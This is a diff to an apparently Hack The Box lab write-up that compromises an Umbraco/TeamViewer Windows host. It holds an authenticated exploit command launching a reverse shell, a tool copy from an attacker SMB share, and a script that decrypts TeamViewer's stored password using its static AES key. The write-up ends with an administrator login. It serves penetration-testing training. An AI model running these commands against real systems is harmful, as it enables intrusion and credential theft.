@@ -224,7 +224,7 @@ baconandcheese
 * admin@htb.local:baconandcheese
 * Navigate to the umbraco login page and login
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 * Here is where I asked myself the question "okay what can we do with our admin credentials in the Umbraco CMS?"
 
@@ -290,7 +290,7 @@ Detonate the reverse shell payload:
 python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "C:/ftp_transfer/shell-x64.exe"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Shell</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>Shell</p></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -308,8 +308,65 @@ copy \\10.10.16.2\smb\winPEASx64.exe
 * Unfortunately, I could not find anything
 * After enumerating the file system, specifially Program Files (x86), I notice the TeamViewer is installed
 * I also noticed that it is running version 7 hence the directory name
-*
 
-### PrivEsc vector
+Supposedly, we can use this registry key to decrypt the hash:
 
-## Proofs
+```
+reg query HKLM\SOFTWARE\WOw6432Node\TeamViewer\Version7 /v SecurityPasswordAES
+HKEY_LOCAL_MACHINE\SOFTWARE\WOw6432Node\TeamViewer\Version7                                                                                                      
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+```
+
+REG\_BINARY:  <mark style="color:yellow;">FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</mark>
+
+* We then take the REG\_BINARY and put it in the decryption tool found on GitHub
+
+Decryption code:
+
+```
+import sys, hexdump, binascii
+from Crypto.Cipher import AES
+
+class AESCipher:
+    def __init__(self, key):
+        self.key = key
+
+    def decrypt(self, iv, data):
+        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self.cipher.decrypt(data)
+
+key = binascii.unhexlify("0602000000a400005253413100040000")
+iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
+hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"                     # output from the registry
+
+ciphertext = binascii.unhexlify(hex_str_cipher)
+
+raw_un = AESCipher(key).decrypt(iv, ciphertext)
+
+print(hexdump.hexdump(raw_un))
+
+password = raw_un.decode('utf-16')
+print(password)
+```
+
+* <mark style="color:yellow;">Replace the hex string cipher part with the REG\_BINARY you received from the registry query</mark>
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* Upon executing this script, I get the value !R3m0te!
+
+### Evil-WinRM for the win
+
+```
+evil-winrm -i 10.129.77.90 -u administrator                                                                       Fri 30 Sep 2022 08:16:43 PM EDT
+Enter Password: !R3m0te!
+
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
